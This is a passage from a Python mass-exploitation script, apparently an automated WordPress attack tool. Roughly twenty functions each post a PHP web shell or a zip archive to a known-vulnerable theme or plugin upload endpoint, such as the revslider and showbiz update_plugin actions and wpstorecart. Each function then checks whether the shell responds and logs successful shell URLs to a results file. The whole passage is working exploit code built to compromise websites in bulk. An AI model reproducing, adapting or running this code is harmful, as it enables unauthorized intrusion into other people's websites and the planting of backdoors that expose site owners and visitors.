    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X147(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'uploadfile':open (php, 'rb')}
        postdir = url +"/wp-content/themes/cubed_v1.2/functions/upload-handler.php"
        upload_dir = url +'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X148(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'qqfile':open (php, 'rb')}
        postdir = url +"/wp-content/themes/saico/framework/_scripts/valums_uploader/php.php"
        upload_dir = url +'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X149(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +"/wp-content/themes/synoptic/lib/avatarupload/upload.php"
        upload_dir = url +'/wp-content/uploads/markets/avatars/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X150(url):
    try:
        zipp = "files/Files.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,data=payload,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X151(url):
    try:
        zipp = "files/Files.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,data=payload,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass

def X152(url):
    try:
        zipp = "files/Files.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,data=payload,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass

def X153(url):
    try:
        zipp = "files/Files.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/themes/pindol/framework/plugins/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,data=payload,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X154(url):
    try:
        zipp = "files/Files.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,data=payload,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass

def X155(url):
    try:
        zipp = "files/Files.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,data=payload,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass

def X156(url):
    try:
        zipp = "files/Files.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/themes/centum/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,data=payload,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X157(url):
    try:
        zipp = "files/Files.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/themes/medicate/script/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,data=payload,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass

def X158(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +"/wp-content/themes/MoneyTheme/uploads/upload.php"
        upload_dir = url +'/wp-content/themes/MoneyTheme/uploads/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X159(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'qqfile':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/flipbook/php.php"
        upload_dir = url +'/wp-includes/fb-images/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X160(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/wpstorecart/php/upload.php"
        upload_dir = url +'/wp-content/uploads/wpstorecart/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X161(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file_field':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/dzs-videogallery/admin/upload.php"
        upload_dir = url +'/wp-content/plugins/dzs-videogallery/admin/upload/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X162(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php"
        upload_dir = url +'/wp-content/themes/Directory/images/tmp/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X163(url):
    try:
        php = "files/TitaniumEx.php"
        payload = {'action':'showbiz_ajax_action', 'client_action':'update_plugin'}
        data = {'update_file':open (php, 'rb')}
        postdir = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +'/wp-content/plugins/showbiz/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,data=payload,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X164(url):
    try:
        php = "files/TitaniumEx.php"
        payload = {'folder': '/TitaniumEx/'}
        data = {'file':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/wordpress-member-private-conversation/doupload.php"
        upload_dir = url +'/wp-content/uploads/user_uploads/TitaniumEx/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,data=payload,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X165(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/asset-manager/upload.php"
        upload_dir = url +'/wp-content/uploads/assets/temp/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X166(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php"
        upload_dir = url +'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X167(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'qqfile':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php"
        upload_dir = url +'/wp-content/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X168(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'uploadfiles[]':open (php, 'rb')}
        postdir = url +"/wp-content/uploads/assignments/ms-sitemple.php"
